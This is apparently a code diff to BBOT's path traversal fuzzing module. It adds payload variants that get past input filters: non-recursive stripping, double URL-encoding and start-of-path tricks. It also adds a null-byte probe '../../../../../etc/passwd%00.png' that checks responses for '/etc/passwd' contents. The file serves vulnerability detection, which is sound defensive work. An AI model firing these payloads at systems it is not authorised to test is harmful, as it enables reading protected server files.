@@ -1,6 +1,7 @@
 from .base import BaseLightfuzz
 from bbot.errors import HttpCompareError
 
+import re
 import urllib.parse
 
 
@@ -30,10 +31,27 @@ class PathTraversalLightfuzz(BaseLightfuzz):
                 "doubledot_payload": f"/../a/../{probe_value}",
             },
             "single-dot traversal tolerance (url-encoding)": {
-                "singledot_payload": urllib.parse.quote(f"/./{probe_value}".encode(), safe=""),
-                "doubledot_payload": urllib.parse.quote(f"/../{probe_value}".encode(), safe=""),
+                "singledot_payload": urllib.parse.quote(f"/./a/../{probe_value}".encode(), safe=""),
+                "doubledot_payload": urllib.parse.quote(f"/../a/../{probe_value}".encode(), safe=""),
+            },
+            "single-dot traversal tolerance (non-recursive stripping)": {
+                "singledot_payload": f"/...//{probe_value}",
+                "doubledot_payload": f"/....//....//{probe_value}",
+            },
+            "single-dot traversal tolerance (double url-encoding)": {
+                "singledot_payload": f"%252f.%252f{probe_value}",
+                "doubledot_payload": f"%252f..%252f{probe_value}",
             },
         }
+
+        linux_path_regex = re.match(r"\/(?:\w+\/?)+\.\w+", probe_value)
+        if linux_path_regex is not None:
+            original_path_only = "/".join(probe_value.split("/")[:-1])
+            original_filename_only = probe_value.split("/")[-1]
+            path_techniques["single-dot traversal tolerance (start of path validation)"] = {
+                 "singledot_payload": f"{original_path_only}/./{original_filename_only}",
+               "doubledot_payload": f"{original_path_only}/../{original_filename_only}"
+            }
 
         for path_technique, payloads in path_techniques.items():
 
@@ -70,7 +88,7 @@ class PathTraversalLightfuzz(BaseLightfuzz):
 
         # Absolute path test
 
-        absolute_paths = {r"c:\\windows\\win.ini": "; for 16-bit app support", "/etc/passwd": "daemon:x:"}
+        absolute_paths = {r"c:\\windows\\win.ini": "; for 16-bit app support", "/etc/passwd": "daemon:x:", "../../../../../etc/passwd%00.png": "daemon:x:"}
 
         for path, trigger in absolute_paths.items():
             r = await self.standard_probe(self.event.data["type"], cookies, path)
